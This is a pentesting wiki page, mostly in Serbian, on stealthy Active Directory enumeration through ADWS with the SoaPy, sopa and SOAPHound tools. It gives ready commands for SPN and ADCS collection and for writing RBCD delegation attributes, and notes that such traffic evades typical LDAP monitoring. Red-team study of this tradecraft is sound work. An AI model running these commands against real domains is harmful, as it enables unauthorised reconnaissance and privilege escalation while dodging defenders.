# Active Directory Web Services (ADWS) Enumeracija i prikriveno prikupljanje

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i sluša na TCP **9389**. Uprkos imenu, **HTTP nije uključen**. Umesto toga, servis izlaže LDAP-style podatke kroz sloj vlasničkih .NET framing protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran u ovim binarnim SOAP okvirima i prolazi preko neuobičajenog porta, **enumeration through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**. Za operatore to znači:

* Diskretnije prikupljanje informacija — Blue teams često se fokusiraju na LDAP upite.
* Mogućnost prikupljanja sa **non-Windows hosts (Linux, macOS)** tunelovanjem 9389/TCP preko SOCKS proxy-ja.
* Iste podatke koje biste dobili preko LDAP-a (users, groups, ACLs, schema, itd.) i mogućnost izvođenja **writes** operacija (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

Interakcije sa ADWS-om se realizuju preko WS-Enumeration: svaki upit počinje sa `Enumerate` porukom koja definiše LDAP filter/atribute i vraća `EnumerationContext` GUID, nakon čega sledi jedna ili više `Pull` poruka koje strimuju do prozora rezultata definisanog od strane servera. Konteksti ističu posle ~30 minuta, pa alati moraju da paginiraju rezultate ili da razdvoje filtere (prefiks upiti po CN) da bi izbegli gubitak stanja. Kada tražite security descriptor-e, navedite `LDAP_SERVER_SD_FLAGS_OID` kontrolu da izostavite SACLs, u suprotnom ADWS jednostavno izbaci `nTSecurityDescriptor` atribut iz svog SOAP odgovora.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**. Kreira NBFX/NBFSE/NNS/NMF frames bajt po bajt, omogućavajući prikupljanje sa Unix-like sistema bez dodirivanja .NET runtime-a.

### Ključne karakteristike

* Podržava **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Zastavice za ciljano prikupljanje & write operacije

SoaPy dolazi sa kuriranim switch-evima koji replikaju najčešće LDAP hunting zadatke preko ADWS-a: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knobs za custom pulls. Upari ih sa write primitivima kao `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za targeted Kerberoasting) i `--asrep` (preokrene `DONT_REQ_PREAUTH` u `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/credentials da odmah weaponise findings: dump RBCD-capable objects sa `--rbcds`, zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da postavite Resource-Based Constrained Delegation chain (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za celu putanju zloupotrebe).

### Instalacija (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - praktičan klijent za ADWS u Golangu

Slično soapy, [sopa](https://github.com/Macmod/sopa) implementira ADWS sloj protokola (MS-NNS + MC-NMF + SOAP) u Golangu, izlažući komandne opcije za izdavanje ADWS poziva kao što su:

* **Pretraga i dohvatanje objekata** - `query` / `get`
* **Životni ciklus objekta** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Uređivanje atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i drugi kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET collector koji drži sve LDAP interakcije unutar ADWS i emituje BloodHound v4-kompatibilan JSON. Napravi kompletan keš `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` jednom (`--buildcache`), a zatim ga ponovo koristi za visokopropusne `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (AD-integrisani DNS) prolaze, tako da samo ~35 kritičnih atributa napušta DC. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite po CN prefiksu da ostane ispod 30-minutnog EnumerationContext timeout-a u velikim forest-ima.

Tipičan tok rada na operator VM priključenom na domen:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON se direktno ubacuje u SharpHound/BloodHound tokove rada — vidi [BloodHound methodology](bloodhound.md) za ideje o daljem prikazu grafova. AutoSplit čini SOAPHound otpornim u šumama sa više miliona objekata, istovremeno održavajući broj upita nižim nego kod ADExplorer-style snapshots.

## Stealth AD Collection Workflow

Sledeći tok rada prikazuje kako da enumerišete **domain & ADCS objects** preko ADWS, konvertujete ih u BloodHound JSON i tražite puteve napada zasnovane na sertifikatima — sve sa Linux-a:

1. **Tunnel 9389/TCP** iz ciljne mreže do vaše mašine (npr. putem Chisel, Meterpreter, SSH dynamic port-forward itd.). Postavite `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy’s `--proxyHost/--proxyPort`.

2. **Sakupite root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Prikupite objekte povezane sa ADCS iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što su `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da otkrijete puteve eskalacije sertifikata (ESC1, ESC8, itd.).

### Pisanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za kompletan Resource-Based Constrained Delegation lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Sažetak alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, čitanje/pisanje |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Pretvara SoaPy/ldapsearch logove |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Može se koristiti kroz isti SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generički klijent za interakciju sa poznatim ADWS endpoint-ima - omogućava enumeraciju, kreiranje objekata, izmene atributa i promenu lozinki |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
